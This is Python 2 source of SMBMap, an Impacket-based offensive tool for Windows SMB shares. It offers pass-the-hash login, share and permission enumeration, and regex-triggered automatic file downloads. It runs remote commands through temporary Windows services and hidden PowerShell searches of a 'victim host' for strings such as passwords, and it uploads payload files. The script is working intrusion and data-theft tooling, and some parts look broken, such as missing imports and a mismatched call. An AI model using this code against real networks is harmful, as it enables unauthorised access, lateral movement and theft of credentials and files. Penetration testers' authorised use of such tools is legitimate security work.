#! /usr/bin/env python2
import sys
import uuid
import signal
import string
import time
import random
import string
import logging
import ConfigParser
import argparse

from threading import Thread
#from impacket import smb, version, smb3, nt_errors, smbserver
#from impacket.dcerpc.v5 import samr, transport, srvs
#from impacket.dcerpc.v5.dtypes import NULL

from impacket.examples import logger
from impacket import version, smbserver
from impacket.smbconnection import *
from impacket.dcerpc.v5 import transport, scmr

import ntpath
import cmd
import os
import re

# A lot of this code was taken from Impacket's own examples
# https://impacket.googlecode.com
# Seriously, the most amazing Python library ever!!
# Many thanks to that dev team

OUTPUT_FILENAME = ''.join(random.sample('ABCDEFGHIGJLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',10))
BATCH_FILENAME  = ''.join(random.sample('ABCDEFGHIGJLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 10)) + '.bat'
SMBSERVER_DIR   = ''.join(random.sample('ABCDEFGHIGJLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 10))
DUMMY_SHARE     = 'TMP'
PERM_DIR = ''.join(random.sample('ABCDEFGHIGJLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 10))

class SMBServer(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.smb = None

    def cleanup_server(self):
        logging.info('Cleaning up..')
        try:
            os.unlink(SMBSERVER_DIR + '/smb.log')
        except:
            pass
        os.rmdir(SMBSERVER_DIR)

    def run(self):
        # Here we write a mini config for the server
        smbConfig = ConfigParser.ConfigParser()
        smbConfig.add_section('global')
        smbConfig.set('global','server_name','server_name')
        smbConfig.set('global','server_os','UNIX')
        smbConfig.set('global','server_domain','WORKGROUP')
        smbConfig.set('global','log_file',SMBSERVER_DIR + '/smb.log')
        smbConfig.set('global','credentials_file','')

        # Let's add a dummy share
        smbConfig.add_section(DUMMY_SHARE)
        smbConfig.set(DUMMY_SHARE,'comment','')
        smbConfig.set(DUMMY_SHARE,'read only','no')
        smbConfig.set(DUMMY_SHARE,'share type','0')
        smbConfig.set(DUMMY_SHARE,'path',SMBSERVER_DIR)

        # IPC always needed
        smbConfig.add_section('IPC$')
        smbConfig.set('IPC$','comment','')
        smbConfig.set('IPC$','read only','yes')
        smbConfig.set('IPC$','share type','3')
        smbConfig.set('IPC$','path')

        self.smb = smbserver.SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)
        logging.info('Creating tmp directory')
        try:
            os.mkdir(SMBSERVER_DIR)
        except Exception, e:
            logging.critical(str(e))
            pass
        logging.info('Setting up SMB Server')
        self.smb.processConfigFile()
        logging.info('Ready to listen...')
        try:
            self.smb.serve_forever()
        except:
            pass

    def stop(self):
        self.cleanup_server()
        self.smb.socket.close()
        self.smb.server_close()
        self._Thread__stop()

class CMDEXEC:
    def __init__(self, username='', password='', domain='', hashes=None, aesKey=None,
                 doKerberos=None, kdcHost=None, mode='SHARE', share=None, port=445, command=None):

        self.__username = username
        self.__password = password
        self.__port = port
        self.__serviceName = OUTPUT_FILENAME
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__share = share
        self.__mode  = mode
        self.shell = None
        self.command = command
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, remoteName, remoteHost):
        stringbinding = 'ncacn_np:%s[\pipe\svcctl]' % remoteName
        logging.debug('StringBinding %s'%stringbinding)
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        rpctransport.set_dport(self.__port)
        if hasattr(rpctransport,'setRemoteHost'):
            rpctransport.setRemoteHost(remoteHost)
        else:
            rpctransport.__dstip = remoteHost
        if hasattr(rpctransport,'preferred_dialect'):
            rpctransport.preferred_dialect(SMB_DIALECT)
        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey)
        #rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

        self.shell = None
        try:
            if self.__mode == 'SERVER':
                serverThread = SMBServer()
                serverThread.daemon = True
                serverThread.start()
            self.shell = RemoteShell(self.__share, rpctransport, self.__mode, self.__serviceName)
            self.shell.send_data(self.command)
            if self.__mode == 'SERVER':
                serverThread.stop()
        except  (Exception, KeyboardInterrupt), e:
            print '[!] Something went wrong:', str(e)
            #import traceback
            #traceback.print_exc()
            #logging.critical(str(e))
            #sys.stdout.flush()
            #sys.exit(1)

class RemoteShell(cmd.Cmd):
    def __init__(self, share, rpc, mode, serviceName):
        cmd.Cmd.__init__(self)
        self.__share = share
        self.__mode = mode
        self.__output = '\\\\127.0.0.1\\' + self.__share + '\\' + OUTPUT_FILENAME
        self.__batchFile = '%TEMP%\\' + BATCH_FILENAME
        self.__outputBuffer = ''
        self.__command = ''
        self.__shell = '%COMSPEC% /Q /c '
        self.__serviceName = serviceName
        self.__rpc = rpc

        self.__scmr = rpc.get_dce_rpc()
        try:
            self.__scmr.connect()
        except Exception, e:
            #logging.critical(str(e))
            print e
            sys.exit(1)

        s = rpc.get_smb_connection()

        # We don't wanna deal with timeouts from now on.
        s.setTimeout(100000)
        if mode == 'SERVER':
            myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
            self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, DUMMY_SHARE)

        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(self.__scmr)
        self.__scHandle = resp['lpScHandle']
        self.transferClient = rpc.get_smb_connection()
        self.do_cd('')

    def finish(self):
        # Just in case the service is still created
        try:
           self.__scmr = self.__rpc.get_dce_rpc()
           self.__scmr.connect()
           self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
           resp = scmr.hROpenSCManagerW(self.__scmr)
           self.__scHandle = resp['lpScHandle']
           resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
           service = resp['lpServiceHandle']
           scmr.hRDeleteService(self.__scmr, service)
           scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
           scmr.hRCloseServiceHandle(self.__scmr, service)
        except:
           pass

    def do_shell(self, s):
        os.system(s)

    def do_exit(self, s):
        return True

    def emptyline(self):
        return False

    def do_cd(self, s):
        # We just can't CD or mantain track of the target dir.
        if len(s) > 0:
            logging.error("You can't CD under SMBEXEC. Use full paths.")

        self.execute_remote('cd ' )
        if len(self.__outputBuffer) > 0:
            # Stripping CR/LF
            self.prompt = string.replace(self.__outputBuffer,'\r\n','') + '>'
            self.__outputBuffer = ''

    def do_CD(self, s):
        return self.do_cd(s)

    def default(self, line):
        if line != '':
            self.send_data(line)

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data

        if self.__mode == 'SHARE':
            self.transferClient.getFile(self.__share, OUTPUT_FILENAME, output_callback)
            self.transferClient.deleteFile(self.__share, OUTPUT_FILENAME)
        else:
            fd = open(SMBSERVER_DIR + '/' + OUTPUT_FILENAME,'r')
            output_callback(fd.read())
            fd.close()
            os.unlink(SMBSERVER_DIR + '/' + OUTPUT_FILENAME)

    def execute_remote(self, data):
        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & ' + \
                  self.__shell + self.__batchFile
        if self.__mode == 'SERVER':
            command += ' & ' + self.__copyBack
        command += ' & ' + 'del ' + self.__batchFile

        logging.debug('Executing %s' % command)
        resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName, lpBinaryPathName=command)
        service = resp['lpServiceHandle']

        try:
           scmr.hRStartServiceW(self.__scmr, service)
        except:
           pass
        scmr.hRDeleteService(self.__scmr, service)
        scmr.hRCloseServiceHandle(self.__scmr, service)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data)
        print self.__outputBuffer
        self.__outputBuffer = ''


class SMBMap():
    KNOWN_PROTOCOLS = {
        '139/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 139),
        '445/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 445),
        }

    def __init__(self):
        self.recursive = False
        self.list_files = False
        self.smbconn = {}
        self.isLoggedIn = False
        self.pattern = None
        self.hosts = {}
        self.jobs = {}
        self.search_output_buffer = ''

    def login(self, host, username, password, domain):
        try:
            self.smbconn[host] = SMBConnection(host, host, sess_port=445, timeout=4)
            self.smbconn[host].login(username, password, domain=domain)

            if self.smbconn[host].isGuestSession() > 0:
                print '[+] Guest SMB session established on %s...' % (host)
            else:
                print '[+] User SMB session establishd on %s...' % (host)
            return True

        except Exception as e:
            print '[!] Authentication error occured'
            print '[!]', e
            return False

    def logout(self, host):
        self.smbconn[host].logoff()

    def smart_login(self):
        for host in self.hosts.keys():
            success = False
            if self.is_ntlm(self.hosts[host]['passwd']):
                print '[+] Hash detected, using pass-the-hash to authentiate'
                if self.hosts[host]['port'] == 445:
                    success = self.login_hash(host, self.hosts[host]['user'], self.hosts[host]['passwd'], self.hosts[host]['domain'])
                else:
                    success = self.login_rpc_hash(host, self.hosts[host]['user'], self.hosts[host]['passwd'], self.hosts[host]['domain'])
            else:
                if self.hosts[host]['port'] == 445:
                    success = self.login(host, self.hosts[host]['user'], self.hosts[host]['passwd'], self.hosts[host]['domain'])
                else:
                    success = self.login_rpc(host, self.hosts[host]['user'], self.hosts[host]['passwd'], self.hosts[host]['domain'])

            if not success:
                print '[!] Authentication error on %s' % (host)
                self.smbconn.pop(host,None)
                self.hosts.pop(host, None)
                continue


    def login_rpc_hash(self, host, username, ntlmhash, domain):
        lmhash, nthash = ntlmhash.split(':')

        try:
            self.smbconn[host] = SMBConnection('*SMBSERVER', host, sess_port=139, timeout=4)
            self.smbconn[host].login(username, '', domain, lmhash=lmhash, nthash=nthash)

            if self.smbconn[host].isGuestSession() > 0:
                print '[+] Guest RPC session established on %s...' % (host)
            else:
                print '[+] User RPC session establishd on %s...' % (host)
            return True

        except Exception as e:
            print '[!] RPC Authentication error occured'
            return False

    def login_rpc(self, host, username, password, domain):
        try:
            self.smbconn[host] = SMBConnection('*SMBSERVER', host, sess_port=139, timeout=4)
            self.smbconn[host].login(username, password, domain)

            if self.smbconn[host].isGuestSession() > 0:
                print '[+] Guest RPC session established on %s...' % (host)
            else:
                print '[+] User RPC session establishd on %s...' % (host)
            return True

        except Exception as e:
            print '[!] RPC Authentication error occured'
            return False

    def login_hash(self, host, username, ntlmhash, domain):
        lmhash, nthash = ntlmhash.split(':')
        try:
            self.smbconn[host] = SMBConnection(host, host, sess_port=445, timeout=4)
            self.smbconn[host].login(username, '', domain, lmhash=lmhash, nthash=nthash)

            if self.smbconn[host].isGuestSession() > 0:
                print '[+] Guest session established on %s...' % (host)
            else:
                print '[+] User session establishd on %s...' % (host)
            return True

        except Exception as e:
            print '[!] Authentication error occured'
            print '[!]', e
            return False

    def find_open_ports(self, address, port):
        result = 1
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((address,port))
            if result == 0:
                sock.close()
                return True
        except:
            return False

    def start_file_search(self, host, pattern, share, search_path):
        job_name = str(uuid.uuid4().get_hex())[0:24]
        try:
            tmp_dir = self.exec_command(host, share, 'echo %TEMP%', False).strip()
            if len(tmp_dir) == 0:
                tmp_dir = 'C:\\Windows\\Temp'
            ps_command = 'powershell -command "Start-Process cmd -ArgumentList """"/c """"""""findstr /R /S /M /P /C:""""""""%s"""""""" %s\*.* 2>nul > %s\%s.txt"""""""" """" -WindowStyle hidden"' % (pattern, search_path, tmp_dir, job_name)
            success = self.exec_command(None, host, share, ps_command, False)
            self.jobs[job_name] = { 'host' : host, 'share' : share, 'tmp' : tmp_dir , 'pattern' : pattern}
            print '[+] Job %s started on %s, result will be stored at %s\%s.txt' % (job_name, host, tmp_dir, job_name)
        except Exception as e:
            print e
            print '[!] Job creation failed on host: %s' % (host)

    def get_search_results(self):
        print '[+] Grabbing search results, be patient, share drives tend to be big...'
        counter = 0
        num_jobs = len(self.jobs.keys())
        while len(self.jobs.keys()) > 0:
            try:
                for job in self.jobs.keys():
                    isItThere = self.exec_command(self.jobs[job]['host'], self.jobs[job]['share'], 'cmd /c "if exist %s\%s.txt echo ImHere"' % (self.jobs[job]['tmp'], job), False)
                    result = self.exec_command(self.jobs[job]['host'], self.jobs[job]['share'], 'cmd /c "2>nul (>>%s\%s.txt (call )) && (echo not locked) || (echo locked)"' % (self.jobs[job]['tmp'], job), False)
                    dl_target = '%s%s\%s.txt' % (self.jobs[job]['share'], self.jobs[job]['tmp'][2:], job)
                    if 'not locked' ==  result.strip() and isItThere.strip() == 'ImHere':
                        dl_target = '%s%s\%s.txt' % (self.jobs[job]['share'], self.jobs[job]['tmp'][2:], job)
                        host_dest = self.download_file(self.jobs[job]['host'], dl_target, False)
                        counter += 1
                        self.search_output_buffer += 'Host: %s \t\tPattern: %s\n' % (self.jobs[job]['host'], self.jobs[job]['pattern'])
                        if os.stat(host_dest).st_size > 0:
                            results_file = open(host_dest)
                            self.search_output_buffer += results_file.read()
                            self.search_output_buffer += '\n'
                        else:
                            self.search_output_buffer += 'No matching patterns found\n\n'
                        print '[+] Job %d of %d completed on %s...' % (counter, num_jobs, self.jobs[job]['host'])
                        self.delete_file(self.jobs[job]['host'], dl_target, False)
                        self.jobs.pop(job, None)
                        if counter >= num_jobs:
                            break
                    else:
                        time.sleep(10)
            except Exception as e:
                print e
        print '[+] All jobs complete'
        print self.search_output_buffer

    def list_drives(self, host, share):
        counter = 0
        disks = []
        local_disks = self.exec_command( host, share, 'fsutil fsinfo drives', False)
        net_disks_raw = self.exec_command( host, share, 'net use', False)
        net_disks = ''
        for line in net_disks_raw.split('\n'):
            if ':' in line:
                data = line.split(' ')
                data = filter(lambda a: a != '', data)
                for item in data:
                    counter += 1
                    net_disks += '%s\t\t' % (item)
                    if '\\' in item:
                        net_disks += ' '.join(data[counter:])
                        break
                disks.append(net_disks)
                net_disks = ''
        print '[+] Host %s Local %s' % (host, local_disks.strip())
        print '[+] Host %s Net Drive(s):' % (host)
        if len(disks) > 0:
            for disk in disks:
                 print '\t%s' % (disk)
        else:
            print '\tNo mapped network drives'
        pass

    def output_shares(self, host, lsshare, lspath, verbose=True, depth=255):
        shareList = [lsshare] if lsshare else self.get_shares(host)
        for share in shareList:
            error = 0
            pathList = {}
            canWrite = False
            try:
                root = string.replace('/%s' % (PERM_DIR),'/','\\')
                root = ntpath.normpath(root)
                self.create_dir(host, share, root)
                print '\t%s\tREAD, WRITE' % (share.ljust(50))
                canWrite = True
                try:
                    self.remove_dir(host, share, root)
                except:
                    print '\t[!] Unable to remove test directory at \\\\%s\\%s%s, plreae remove manually' % (host, share, root)
            except Exception as e:
                #print e
                exc_type, exc_obj, exc_tb = sys.exc_info()
                fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                #print(exc_type, fname, exc_tb.tb_lineno)
                sys.stdout.flush()
                canWrite = False

            if canWrite == False:
                readable = self.list_path(host, share, '', self.pattern, False)
                if readable:
                    print '\t%s\tREAD ONLY' % (share.ljust(50))
                else:
                    error += 1

            try:
                if error == 0:
                    path = '/'
                    if self.list_files and not self.recursive:
                        if lsshare and lspath:
                            if self.pattern:
                                print u'\t[+] Starting search for files matching \'{}\' on share {}.'.format(self.pattern, lsshare)
                            dirList = self.list_path(host, lsshare, lspath, self.pattern, verbose)
                            sys.exit()
                        else:
                            if self.pattern:
                                print u'\t[+] Starting search for files matching \'%s\' on share %s.' % (self.pattern, share)
                            dirList = self.list_path(host, share, path, self.pattern, verbose)

                    if self.recursive:
                        if lsshare and lspath:
                            if self.pattern:
                                print u'\t[+] Starting search for files matching \'%s\' on share %s.' % (self.pattern, lsshare)
                            dirList = self.list_path_recursive(host, lsshare, lspath, '*', pathList, self.pattern, verbose, depth)
                            sys.exit()
                        else:
                            if self.pattern:
                                print u"\t[+] Starting search for files matching \'{}\' on share {}.".format(self.pattern, share)
                            dirList = self.list_path_recursive(host, share, path, '*', pathList, self.pattern, verbose, depth)
            except Exception as e:
                exc_type, exc_obj, exc_tb = sys.exc_info()
                fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                print '[!] Something weird happened: {} on line {}'.format(e, exc_tb.tb_lineno)
                sys.stdout.flush()
                sys.exit()

            if error > 0 and verbose:
                print '\t%s\tNO ACCESS' % (share.ljust(50))

    def get_shares(self, host):
        shareList = self.smbconn[host].listShares()
        shares = []
        for item in range(len(shareList)):
            shares.append(shareList[item]['shi1_netname'][:-1])
        return shares

    def list_path_recursive(self, host, share, pwd, wildcard, pathList, pattern, verbose, depth):
        root = self.pathify(pwd)
        root = ntpath.normpath(root)
        width = 16
        try:
            if (root.count('\\')-2) <= int(depth):
                pathList[root] = self.smbconn[host].listPath(share, root)
                if verbose:
                    print '\t.%s' % (root.strip('*'))
                if len(pathList[root]) > 2:
                    for smbItem in pathList[root]:
                        try:
                            filename = smbItem.get_longname()
                            isDir = 'd' if smbItem.is_directory() > 0 else '-'
                            filesize = smbItem.get_filesize()
                            readonly = 'w' if smbItem.is_readonly() > 0 else 'r'
                            date = time.ctime(float(smbItem.get_mtime_epoch()))
                            if smbItem.is_directory() <= 0:
                                if self.pattern:
                                    fileMatch = re.search(pattern.lower(), filename.lower())
                                    if fileMatch:
                                        dlThis = '%s\\%s/%s' % (share, pwd, filename)
                                        dlThis = dlThis.replace('/', '\\')
                                        print '\t[+] Match found! Downloading: %s' % (ntpath.normpath(dlThis))
                                        self.download_file(host, dlThis, False)
                            if verbose:
                                print '\t%s%s--%s--%s-- %s %s\t%s' % (isDir, readonly, readonly, readonly, str(filesize).rjust(width), date, filename)
                        except SessionError as e:
                            print '[!]', e
                            continue
                        except Exception as e:
                            print '[!]', e
                            exc_type, exc_obj, exc_tb = sys.exc_info()
                            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                            print(exc_type, fname, exc_tb.tb_lineno)
                            sys.stdout.flush()
                    for smbItem in pathList[root]:
                        try:
                            filename = smbItem.get_longname()
                            if smbItem.is_directory() > 0 and filename != '.' and filename != '..':
                                subPath = '%s/%s' % (pwd, filename)
                                subPath = self.pathify(subPath)
                                pathList[subPath] = self.smbconn[host].listPath(share, subPath)
                                if len(pathList[subPath]) > 2:
                                    self.list_path_recursive(host, share, '%s/%s' % (pwd, filename), wildcard, pathList, pattern, verbose, depth)

                        except SessionError as e:
                            continue
        except Exception as e:
            print e
            pass

    def pathify(self, path):
        root = ntpath.join(path,'*')
        root = root.replace('/','\\')
        #root = ntpath.normpath(root)
        return root

    def list_path(self, host, share, path, pattern, verbose=False):
        pwd = self.pathify(path)
        width = 16
        try:
            pathList = self.smbconn[host].listPath(share, pwd)
            if verbose:
                print '\t.%s' % (path.ljust(50))
            for item in pathList:
                filesize = item.get_filesize()
                readonly = 'w' if item.is_readonly() > 0 else 'r'
                date = time.ctime(float(item.get_mtime_epoch()))
                isDir = 'd' if item.is_directory() > 0 else 'f'
                filename = item.get_longname()
                if item.is_directory() <= 0:
                    if self.pattern:
                        fileMatch = re.search(pattern.lower(), filename.lower())
                        if fileMatch:
                            dlThis = '%s\\%s/%s' % (share, ntpath.normpath(pwd.strip('*')), filename)
                            dlThis = dlThis.replace('/','\\')
                            print '\t[+] Match found! Downloading: %s' % (dlThis)
                            self.download_file(host, dlThis, False)
                if verbose:
                    print '\t%s%s--%s--%s-- %s %s\t%s' % (isDir, readonly, readonly, readonly, str(filesize).rjust(width), date, filename)
            return True
        except Exception as e:
            return False

    def create_dir(self, host, share, path):
        #path = self.pathify(path)
        self.smbconn[host].createDirectory(share, path)

    def remove_dir(self, host, share, path):
        #path = self.pathify(path)
        self.smbconn[host].deleteDirectory(share, path)

    def valid_ip(self, address):
        try:
            socket.inet_aton(address)
            return True
        except:
            return False

    def filter_results(self, pattern):
        pass

    def download_file(self, host, path, verbose=True):
        path = path.replace('/','\\')
        path = ntpath.normpath(path)
        filename = path.split('\\')[-1]
        share = path.split('\\')[0]
        path = path.replace(share, '')
        try:
            out = open(ntpath.basename('%s/%s' % (os.getcwd(), '%s-%s%s' % (host, share.replace('$',''), path.replace('\\','_')))),'wb')
            dlFile = self.smbconn[host].listPath(share, path)
            if verbose:
                msg = '[+] Starting download: %s (%s bytes)' % ('%s%s' % (share, path), dlFile[0].get_filesize())
                if self.pattern:
                    msg = '\t' + msg
                print msg
            self.smbconn[host].getFile(share, path, out.write)
            if verbose:
                msg = '[+] File output to: %s/%s' % (os.getcwd(), ntpath.basename('%s/%s' % (os.getcwd(), '%s-%s%s' % (host, share.replace('$',''), path.replace('\\','_')))))
                if self.pattern:
                    msg = '\t'+msg
                print msg
        except SessionError as e:
            if 'STATUS_ACCESS_DENIED' in str(e):
                print '[!] Error retrieving file, access denied'
            elif 'STATUS_INVALID_PARAMETER' in str(e):
                print '[!] Error retrieving file, invalid path'
            elif 'STATUS_SHARING_VIOLATION' in str(e):
                if not verbose:
                    indent = '\t'
                else:
                    indent = ''
                print '%s[!] Error retrieving file %s, sharing violation' % (indent, filename)
                out.close()
                os.remove(ntpath.basename('%s/%s' % (os.getcwd(), '%s-%s%s' % (host, share.replace('$',''), path.replace('\\','_')))))
        except Exception as e:
            print '[!] Error retrieving file, unkown error'
            os.remove(filename)
        out.close()
        return '%s/%s' % (os.getcwd(), ntpath.basename('%s/%s' % (os.getcwd(), '%s-%s%s' % (host, share.replace('$',''), path.replace('\\','_')))))

    def exec_command(self, host, share, command, disp_output = True, host_name=None):
        if self.is_ntlm(self.hosts[host]['passwd']):
            hashes = self.hosts[host]['passwd']
        else:
            hashes = None
        #domain=self.hosts[host]['domain']
        executer = CMDEXEC(username=self.hosts[host]['user'], password=self.hosts[host]['passwd'],  hashes=hashes, share=share, command=command)
        result = executer.run(host_name, host)
        return result

    def delete_file(self, host, path, verbose=True):
        path = path.replace('/','\\')
        path = ntpath.normpath(path)
        filename = path.split('\\')[-1]
        share = path.split('\\')[0]
        path = path.replace(share, '')
        path = path.replace(filename, '')
        try:
            self.smbconn[host].deleteFile(share, path + filename)
            if verbose:
                print '[+] File successfully deleted: %s%s%s' % (share, path, filename)
        except SessionError as e:
            if 'STATUS_ACCESS_DENIED' in str(e):
                print '[!] Error deleting file, access denied'
            elif 'STATUS_INVALID_PARAMETER' in str(e):
                print '[!] Error deleting file, invalid path'
            elif 'STATUS_SHARING_VIOLATION' in str(e):
                print '[!] Error retrieving file, sharing violation'
            else:
                print '[!] Error deleting file %s%s%s, unkown error' % (share, path, filename)
                print '[!]', e
        except Exception as e:
            print '[!] Error deleting file %s%s%s, unkown error' % (share, path, filename)
            print '[!]', e

    def upload_file(self, host, src, dst):
        dst = string.replace(dst,'/','\\')
        dst = ntpath.normpath(dst)
        dst = dst.split('\\')
        share = dst[0]
        dst = '\\'.join(dst[1:])
        if os.path.exists(src):
            print '[+] Starting upload: %s (%s bytes)' % (src, os.path.getsize(src))
            upFile = open(src, 'rb')
            try:
                self.smbconn[host].putFile(share, dst, upFile.read)
                print '[+] Upload complete'
            except Exception as e:
                print '[!]', e
                print '[!] Error uploading file, you need to include destination file name in the path'
            upFile.close()
        else:
            print '[!] Invalid source. File does not exist'
            sys.exit()

    def is_ntlm(self, password):
        try:
            if len(password.split(':')) == 2:
                lm, ntlm = password.split(':')
                if len(lm) == 32 and len(ntlm) == 32:
                    return True
                else:
                    return False
        except Exception as e:
            return False

    def get_version(self, host):
        try:
            rpctransport = transport.SMBTransport(self.smbconn[host].getServerName(), self.smbconn[host].getRemoteHost(), filename = r'\srvsvc', smb_connection = self.smbconn[host])
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(srvs.MSRPC_UUID_SRVS)
            resp = srvs.hNetrServerGetInfo(dce, 102)

            print "Version Major: %d" % resp['InfoStruct']['ServerInfo102']['sv102_version_major']
            print "Version Minor: %d" % resp['InfoStruct']['ServerInfo102']['sv102_version_minor']
            print "Server Name: %s" % resp['InfoStruct']['ServerInfo102']['sv102_name']
            print "Server Comment: %s" % resp['InfoStruct']['ServerInfo102']['sv102_comment']
            print "Server UserPath: %s" % resp['InfoStruct']['ServerInfo102']['sv102_userpath']
            print "Simultaneous Users: %d" % resp['InfoStruct']['ServerInfo102']['sv102_users']
        except Exception as e:
            print '[!] RPC Access denied...oh well'
            print '[!]', e
            exc_type, exc_obj, exc_tb = sys.exc_info()
            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
            print(exc_type, fname, exc_tb.tb_lineno)
            sys.exit()

def signal_handler(signal, frame):
    print 'You pressed Ctrl+C!'
    sys.exit(1)

if __name__ == "__main__":

    example = 'Examples:\n\n'
    example += '$ python smbmap.py -u jsmith -p password1 -d workgroup -H 192.168.0.1\n'
    example += '$ python smbmap.py -u jsmith -p \'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d\' -H 172.16.0.20\n'
    example += '$ python smbmap.py -u \'apadmin\' -p \'asdf1234!\' -d ACME -H 10.1.3.30 -x \'net group "Domain Admins" /domain\'\n'

    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, description="SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com", epilog=example)

    sgroup = parser.add_argument_group("Main arguments")
    mex_group = sgroup.add_mutually_exclusive_group(required=True)
    mex_group.add_argument("-H", metavar="HOST", dest='host', type=str, help="IP of host")
    mex_group.add_argument("--host-file", metavar="FILE", dest="hostfile", type=argparse.FileType('r'), help="File containing a list of hosts")
    sgroup.add_argument("-u", metavar="USERNAME", dest='user', default='', help="Username, if omitted null session assumed")
    sgroup.add_argument("-p", metavar="PASSWORD", dest='passwd', default='', help="Password or NTLM hash")
    sgroup.add_argument("-s", metavar="SHARE", dest='share', default="C$", help="Specify a share (default C$), ex 'C$'")
    sgroup.add_argument("-d", metavar="DOMAIN", dest='domain', default="WORKGROUP", help="Domain name (default WORKGROUP)")
    sgroup.add_argument("-P", metavar="PORT", dest='port', type=int, default=445, help="SMB port (default 445)")

    sgroup2 = parser.add_argument_group("Command Execution", "Options for executing commands on the specified host")
    sgroup2.add_argument("-x", metavar="COMMAND", dest='command', help="Execute a command ex. 'ipconfig /all'")

    sgroup3 = parser.add_argument_group("Filesystem Search", "Options for searching/enumerating the filesystem of the specified host")
    mex_group2 = sgroup3.add_mutually_exclusive_group()
    mex_group2.add_argument("-L", dest='list_drives', action="store_true", help="List all drives on the specified host")
    mex_group2.add_argument("-R", metavar="PATH", dest="recursive_dir_list", nargs="?", const='', help="Recursively list dirs, and files (no share\path lists ALL shares), ex. 'C$\\Finance'")
    mex_group2.add_argument("-r", metavar="PATH", dest="dir_list", nargs="?", const='', help="List contents of directory, default is to list root of all shares, ex. -r 'C$\Documents and Settings\Administrator\Documents'")
    sgroup3.add_argument("-A", metavar="PATTERN", dest="pattern", help="Define a file name pattern (regex) that auto downloads a file on a match (requires -R or -r), not case sensitive, ex '(web|global).(asax|config)'")
    sgroup3.add_argument("-q", dest="verbose", default=True, action="store_false", help="Disable verbose output. Only shows shares you have READ/WRITE on, and suppresses file listing when performing a search (-A).")
    sgroup3.add_argument("--depth", dest="depth", default=255, help="Traverse a directory tree to a specific depth")

    sgroup4 = parser.add_argument_group("File Content Search", "Options for searching the content of files")
    sgroup4.add_argument("-F", dest="file_content_search", metavar="PATTERN", help="File content search, -F '[Pp]assword' (requires admin access to execute commands, and powershell on victim host)")
    sgroup4.add_argument("--search-path", dest="search_path", default="C:\\Users", metavar="PATH", help="Specify drive/path to search (used with -F, default C:\\Users), ex 'D:\\HR\\'")

    sgroup5 = parser.add_argument_group("Filesystem interaction", "Options for interacting with the specified host's filesystem")
    sgroup5.add_argument("--download", dest='dlPath', metavar="PATH", help="Download a file from the remote system, ex.'C$\\temp\\passwords.txt'")
    sgroup5.add_argument("--upload", nargs=2, dest='upload', metavar=('SRC', 'DST'), help="Upload a file to the remote system ex. '/tmp/payload.exe C$\\temp\\payload.exe'")
    sgroup5.add_argument("--delete", dest="delFile", metavar="PATH TO FILE", help="Delete a remote file, ex. 'C$\\temp\\msf.exe'")
    sgroup5.add_argument("--skip", default=False, action="store_true", help="Skip delete file confirmation prompt")


    if len(sys.argv) is 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()

    signal.signal(signal.SIGINT, signal_handler)

    host = dict()
    mysmb = SMBMap()

    lsshare = False
    lspath = False



    if args.recursive_dir_list != None:
        mysmb.recursive = True
        mysmb.list_files = True
        try:
            lspath = args.recursive_dir_list.replace('/','\\').split('\\')
            lsshare = lspath[0]
            lspath = '\\'.join(lspath[1:])
        except:
            pass

    elif args.dir_list != None:
        mysmb.list_files = True
        try:
            lspath = args.dir_list.replace('/','\\').split('\\')
            lsshare = lspath[0]
            lspath = '\\'.join(lspath[1:])
        except:
            pass

    print '[+] Finding open SMB ports....'
    socket.setdefaulttimeout(3)
    if args.hostfile:
        for ip in args.hostfile:
            try:
                if mysmb.find_open_ports(ip.strip(), args.port):
                    try:
                        host[ip.strip()] = { 'name' : socket.getnameinfo((ip.strip(), args.port),0)[0] , 'port' : args.port, 'user' : args.user, 'passwd' : args.passwd, 'domain' : args.domain}
                    except:
                        host[ip.strip()] = { 'name' : 'unkown', 'port' : 445, 'user' : args.user, 'passwd' : args.passwd, 'domain' : args.domain }
            except Exception as e:
                print '[!]', e
                continue

    elif args.host:
        if mysmb.find_open_ports(args.host, args.port):
            try:
                host[args.host.strip()] = { 'name' : socket.getnameinfo((args.host.strip(), args.port),0)[0], 'port' : args.port, 'user' : args.user, 'passwd' : args.passwd, 'domain' : args.domain}
            except:
                host[args.host.strip()] = { 'name' : 'unkown', 'port' : 445, 'user' : args.user, 'passwd' : args.passwd, 'domain' : args.domain }

